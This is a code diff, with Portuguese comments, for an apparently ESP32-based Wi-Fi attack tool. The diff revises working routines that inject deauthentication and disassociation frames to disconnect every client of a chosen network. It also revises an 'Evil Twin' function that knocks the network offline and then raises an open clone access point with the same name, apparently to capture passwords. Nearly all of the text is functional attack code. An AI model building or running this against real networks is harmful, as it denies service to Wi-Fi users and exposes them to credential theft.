@@ -1,20 +1,12 @@
 // ============================================================
-// wifi_attacks.cpp - CORRIGIDO v5.0 (DEFINITIVO)
+// wifi_attacks.cpp - CORRIGIDO v5.1
 //
-// BASEADO EM:
-// - ESP32-Marauder: bypass -zmuldefs funciona no Arduino-ESP32 v2.x
-// - Arduino.cc tutorial: --wrap eh mais confiavel que -zmuldefs
-// - risinek (esp32-wifi-penetration-tool): rogue AP com MAC spoofado
-// - Paper FIT VUTBR: driver ESP32 manda deauth nativo para clientes
-//   nao-autenticados quando recebe frames enderecados ao BSSID do AP
-//
-// FIXES DEFINITIVOS:
-// 1. Modo APSTA com AP ativo no canal do alvo (interface garantida)
-// 2. Spoof MAC do alvo ANTES de subir AP -> beacons com BSSID correto
-// 3. Usa WIFI_IF_AP para raw_tx (interface ativa = transmite)
-// 4. Deauth nativo do driver + raw_tx de reforço
-// 5. Evil Twin: deauth puro (fase 1) -> depois clone visivel (fase 2)
-// 6. Adiciona debug para confirmar que o bypass funciona
+// FIXES:
+// 1. Remove MAC spoof (causava falha, nao eh necessario com bypass)
+// 2. Espera AP ficar realmente ativo antes de raw_tx
+// 3. raw_tx com retry e delay
+// 4. Modo AP puro no canal do alvo (mais simples, menos falhas)
+// 5. Deauth nativo do driver + raw_tx de reforco
 // ============================================================
 #include <WiFi.h>
 #include <esp_wifi.h>
@@ -31,7 +23,7 @@ static char     deauthTargetSSID[33] = {0};
 static uint8_t  deauthTargetAuth = 0;
 static unsigned long deauthStartTime = 0;
 
-// Frame deauth padrao (formato ESP32-Marauder)
+// Frame deauth padrao
 static uint8_t deauthFrame[26] = {
     0xc0, 0x00,             // FC: Deauthentication
     0x3a, 0x01,             // Duration
@@ -144,19 +136,21 @@ static void stopPromiscuous() {
 }
 
 // ============================================================
-// RAW FRAME (reforço) - usa WIFI_IF_AP porque AP esta ativo
+// RAW FRAME com retry
 // ============================================================
 static bool raw_tx(const uint8_t* frame, size_t len) {
-    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, len, true);
-    if (err == ESP_OK) {
-        deauthPacketCount++;
-        deauthSuccessCount++;
-        return true;
-    } else {
-        static unsigned long lastErr = 0;
-        if (millis() - lastErr > 2000) {
-            lastErr = millis();
-            Serial.printf("[raw_tx] ERR %d\n", err);
+    // Retry ate 3x com delay
+    for (int retry = 0; retry < 3; retry++) {
+        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, len, true);
+        if (err == ESP_OK) {
+            deauthPacketCount++;
+            deauthSuccessCount++;
+            return true;
+        }
+        if (err == ESP_ERR_INVALID_STATE) {
+            delay(10); // AP ainda nao esta pronto
+        } else {
+            break; // outro erro, nao adianta retry
         }
     }
     return false;
@@ -181,13 +175,11 @@ static void setFrameAddrs(uint8_t* frame, const uint8_t* da, const uint8_t* sa, 
 static uint8_t txBuf[26];
 
 static void deauthBurst() {
-    // Broadcast
     memcpy(txBuf, deauthFrame, 26);
     raw_tx(txBuf, 26);
     memcpy(txBuf, disassocFrame, 26);
     raw_tx(txBuf, 26);
 
-    // Unicast bidirecional
     for (int i = 0; i < clientCount; i++) {
         memcpy(txBuf, deauthFrame, 26);
         setFrameAddrs(txBuf, discoveredClients[i], deauthTargetBSSID, deauthTargetBSSID);
@@ -242,7 +234,7 @@ NetworkInfo* getNetwork(uint8_t index) {
 }
 
 // ============================================================
-// DEAUTH - ABORDAGEM HIBRIDA DEFINITIVA
+// DEAUTH - Simplificado, sem MAC spoof, com wait pro AP
 // ============================================================
 void startDeauth(uint8_t networkIndex) {
     if (networkIndex >= networkCount) {
@@ -262,67 +254,63 @@ void startDeauth(uint8_t networkIndex) {
     clientCount = 0;
     deauthStartTime = millis();
 
-    Serial.printf("\n[Deauth] ==========================================\n");
-    Serial.printf("[Deauth] Target: %s\n", target->ssid);
-    Serial.printf("[Deauth] Channel: %d\n", target->channel);
+    Serial.printf("\n[Deauth] Target: %s CH%d\n", target->ssid, target->channel);
     Serial.printf("[Deauth] BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
         target->bssid[0], target->bssid[1], target->bssid[2],
         target->bssid[3], target->bssid[4], target->bssid[5]);
 
     buildDeauthBroadcast();
 
-    // === PASSO 1: Desliga WiFi completamente ===
+    // === PASSO 1: Desliga WiFi ===
     WiFi.disconnect(true);
+    WiFi.softAPdisconnect(true);
     WiFi.mode(WIFI_OFF);
     delay(500);
 
-    // === PASSO 2: Spoof MAC do alvo na interface AP ===
-    // esp_wifi_set_mac() so funciona quando WiFi esta OFF
-    esp_err_t macErr = esp_wifi_set_mac(WIFI_IF_AP, target->bssid);
-    if (macErr != ESP_OK) {
-        Serial.printf("[Deauth] MAC spoof WARN: %d (tentando continuar...)\n", macErr);
-    } else {
-        Serial.println("[Deauth] MAC spoofed to target BSSID OK");
-    }
-    delay(200);
-
-    // === PASSO 3: Inicia modo APSTA ===
-    // APSTA garante que ambas as interfaces existem
-    WiFi.mode(WIFI_AP_STA);
+    // === PASSO 2: Modo AP puro no canal do alvo ===
+    WiFi.mode(WIFI_AP);
     delay(300);
 
-    // === PASSO 4: Sobe AP hidden no canal do alvo ===
-    // Com MAC spoofado, o driver gera beacons com BSSID do alvo!
-    // max_connection=0: nao aceita conexoes, mas responde a probes
+    // === PASSO 3: Sobe AP no canal do alvo ===
     bool apOk = WiFi.softAP("_", "", target->channel, 1, 0);
     WiFi.setTxPower(WIFI_POWER_19_5dBm);
     esp_wifi_set_ps(WIFI_PS_NONE);
-    delay(200);
+
+    // === PASSO 4: ESPERA AP FICAR PRONTO ===
+    // O softAP eh assincrono. Precisamos esperar a interface ficar ativa.
+    Serial.print("[Deauth] Waiting AP ready");
+    int waitCount = 0;
+    while (waitCount < 50) { // max 5 segundos
+        wifi_mode_t mode;
+        esp_wifi_get_mode(&mode);
+        if (mode == WIFI_MODE_AP || mode == WIFI_MODE_APSTA) {
+            // Tenta um ping no raw_tx para ver se a interface responde
+            uint8_t testFrame[26];
+            memcpy(testFrame, deauthFrame, 26);
+            esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, testFrame, 26, true);
+            if (err == ESP_OK) {
+                Serial.println(" OK");
+                break;
+            }
+        }
+        Serial.print(".");
+        delay(100);
+        waitCount++;
+    }
+    if (waitCount >= 50) {
+        Serial.println(" TIMEOUT");
+    }
 
     // Garante canal
     esp_wifi_set_channel(target->channel, WIFI_SECOND_CHAN_NONE);
 
-    // Verifica se o MAC realmente foi spoofado
-    uint8_t currentMac[6];
-    esp_wifi_get_mac(WIFI_IF_AP, currentMac);
-    Serial.printf("[Deauth] AP MAC now: %02X:%02X:%02X:%02X:%02X:%02X\n",
-        currentMac[0], currentMac[1], currentMac[2],
-        currentMac[3], currentMac[4], currentMac[5]);
-
-    if (memcmp(currentMac, target->bssid, 6) != 0) {
-        Serial.println("[Deauth] WARN: MAC spoof failed! Deauth may not work.");
-    }
-
-    Serial.printf("[Deauth] AP hidden on CH%d (softAP: %s)\n", target->channel, apOk ? "OK" : "FAIL");
-    Serial.println("[Deauth] Driver beacons now use target BSSID");
-    Serial.println("[Deauth] Native driver deauth active for unauth clients");
+    Serial.printf("[Deauth] AP on CH%d (softAP: %s)\n", target->channel, apOk ? "OK" : "FAIL");
 
     // Descobrir clientes
     startPromiscuous();
 
     deauthActive = true;
-    Serial.println("[Deauth] STARTED - Hybrid attack (native + raw_tx)");
-    Serial.println("[Deauth] ==========================================\n");
+    Serial.println("[Deauth] STARTED");
 }
 
 void stopDeauth() {
@@ -337,14 +325,7 @@ void stopDeauth() {
     WiFi.softAPdisconnect(true);
     WiFi.disconnect(true);
     WiFi.mode(WIFI_OFF);
-    delay(500);
-
-    // Restaura MAC original
-    uint8_t defaultMac[6];
-    esp_read_mac(defaultMac, ESP_MAC_WIFI_SOFTAP);
-    esp_wifi_set_mac(WIFI_IF_AP, defaultMac);
-    delay(100);
-
+    delay(300);
     WiFi.mode(WIFI_STA);
     delay(200);
 
@@ -358,7 +339,6 @@ void stopDeauth() {
 bool deauthLoop() {
     if (!deauthActive) return false;
 
-    // raw_tx de reforço (8 bursts por frame)
     for (int burst = 0; burst < 8; burst++) {
         deauthBurst();
     }
@@ -366,13 +346,11 @@ bool deauthLoop() {
     static unsigned long lastDebug = 0;
     if (millis() - lastDebug > 5000) {
         lastDebug = millis();
-        int staNum = WiFi.softAPgetStationNum();
-        Serial.printf("[Deauth] runtime=%lus pkts=%lu clients=%d CH%d stations_on_ap=%d\n",
+        Serial.printf("[Deauth] runtime=%lus pkts=%lu clients=%d CH%d\n",
             (millis() - deauthStartTime) / 1000,
             deauthPacketCount,
             clientCount,
-            deauthTargetChannel,
-            staNum);
+            deauthTargetChannel);
     }
     return true;
 }
@@ -414,26 +392,23 @@ void startEvilTwin(uint8_t networkIndex) {
 
     NetworkInfo* target = &scannedNetworks[networkIndex];
 
-    // FASE 1: Deauth hibrido (derruba a rede alvo)
-    Serial.println("[EvilTwin] Phase 1: Starting deauth attack...");
+    // FASE 1: Deauth puro
+    Serial.println("[EvilTwin] Phase 1: Deauth...");
     startDeauth(networkIndex);
 
-    // Deixa derrubando por 5 segundos
     unsigned long start = millis();
     while (millis() - start < 5000) {
         deauthLoop();
         delay(1);
     }
 
-    // FASE 2: Para deauth e sobe clone AP visivel
-    Serial.println("[EvilTwin] Phase 2: Stopping deauth, starting clone AP...");
+    // FASE 2: Para deauth, sobe clone
+    Serial.println("[EvilTwin] Phase 2: Clone AP...");
     stopPromiscuous();
 
-    // O MAC ja esta spoofado. So precisamos tornar o AP visivel e aceitar conexoes.
     WiFi.softAPdisconnect(true);
     delay(300);
 
-    // Sobe clone com SSID do alvo, canal do alvo, visivel, aceita 8 conexoes
     WiFi.softAP(target->ssid, "", target->channel, 0, 8);
     WiFi.setTxPower(WIFI_POWER_19_5dBm);
     WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
@@ -441,10 +416,7 @@ void startEvilTwin(uint8_t networkIndex) {
     fakeAPEnabled = true;
     passwordCaptured = false;
 
-    Serial.printf("[EvilTwin] Clone AP active: %s CH%d\n", target->ssid, target->channel);
-    Serial.printf("[EvilTwin] Clone MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
-        target->bssid[0], target->bssid[1], target->bssid[2],
-        target->bssid[3], target->bssid[4], target->bssid[5]);
+    Serial.printf("[EvilTwin] Clone: %s CH%d\n", target->ssid, target->channel);
 }
 
 // ============================================================
